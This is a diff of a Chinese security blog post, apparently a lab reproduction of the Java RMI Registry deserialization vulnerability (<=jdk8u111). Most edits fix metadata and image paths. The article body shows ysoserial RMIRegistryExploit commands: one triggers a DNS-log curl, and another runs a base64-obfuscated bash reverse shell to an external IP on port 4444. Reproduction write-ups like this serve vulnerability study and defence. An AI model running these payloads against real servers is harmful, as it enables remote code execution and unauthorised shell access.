@@ -81,23 +81,23 @@
 
 
 
-<meta name="description" content="Java RMI Registry 反序列化漏洞(&amp;lt;=jdk8u111) 远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。 RMI 的基本工作原理如下：  定义接口：首先需要定义一个接口，其中包含要在远程计">
+<meta name="description" content="远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。">
 <meta name="keywords" content="Java反序列化">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)">
 <meta property="og:url" content="http://yoursite.com/2022/12/09/Java RMI Registry 反序列化漏洞(=jdk8u111)/index.html">
 <meta property="og:site_name" content="Su.">
-<meta property="og:description" content="Java RMI Registry 反序列化漏洞(&amp;lt;=jdk8u111) 远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。 RMI 的基本工作原理如下：  定义接口：首先需要定义一个接口，其中包含要在远程计">
+<meta property="og:description" content="远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="d:/app/有道云笔记/笔记/漏洞复现练习/images/image-20230910182956085.png">
-<meta property="og:image" content="d:/app/有道云笔记/笔记/漏洞复现练习/images/image-20230910182722694.png">
-<meta property="og:image" content="d:/app/有道云笔记/笔记/漏洞复现练习/images/image-20230910183359239.png">
-<meta property="og:image" content="d:/app/有道云笔记/笔记/漏洞复现练习/images/image-20230910183436780.png">
-<meta property="og:updated_time" content="2023-10-29T11:53:51.411Z">
+<meta property="og:image" content="http://yoursite.com/images/image-20230910182956085.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20230910182722694.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20230910183359239.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20230910183436780.png">
+<meta property="og:updated_time" content="2023-10-29T12:47:49.729Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)">
-<meta name="twitter:description" content="Java RMI Registry 反序列化漏洞(&amp;lt;=jdk8u111) 远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。 RMI 的基本工作原理如下：  定义接口：首先需要定义一个接口，其中包含要在远程计">
-<meta name="twitter:image" content="d:/app/有道云笔记/笔记/漏洞复现练习/images/image-20230910182956085.png">
+<meta name="twitter:description" content="远程方法调用（Remote Method Invocation，简称RMI）是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20230910182956085.png">
 
 
 
@@ -406,8 +406,9 @@
       
 
       
-        <h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><blockquote>
-<p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
+        <p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p>
+<a id="more"></a>
+<blockquote>
 <p>RMI 的基本工作原理如下：</p>
 <ol>
 <li>定义接口：首先需要定义一个接口，其中包含要在远程计算机上调用的方法。接口的实现类将会被注册到 RMI 服务端。</li>
@@ -430,12 +431,12 @@
 <p>dnslog生成一个DNS   <a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p>
 <p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击，攻击机执行如下命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182956085.png" alt="image-20230910182956085"></p>
+<p><img src="/images/image-20230910182956085.png" alt="image-20230910182956085"></p>
 <p>Registry会返回报错，但命令会正常执行。可以看到dnslog成功接收请求</p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182722694.png" alt="image-20230910182722694"></p>
+<p><img src="/images/image-20230910182722694.png" alt="image-20230910182722694"></p>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183359239.png" alt="image-20230910183359239"></p>
-<p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183436780.png" alt="image-20230910183436780"></p>
+<p><img src="/images/image-20230910183359239.png" alt="image-20230910183359239"></p>
+<p><img src="/images/image-20230910183436780.png" alt="image-20230910183436780"></p>
 
       
     </div>
@@ -621,7 +622,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><span class="nav-number">1.</span> <span class="nav-text">Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.4.</span> <span class="nav-text">反弹shell</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a></li></ol></div>
             
 
           </div>
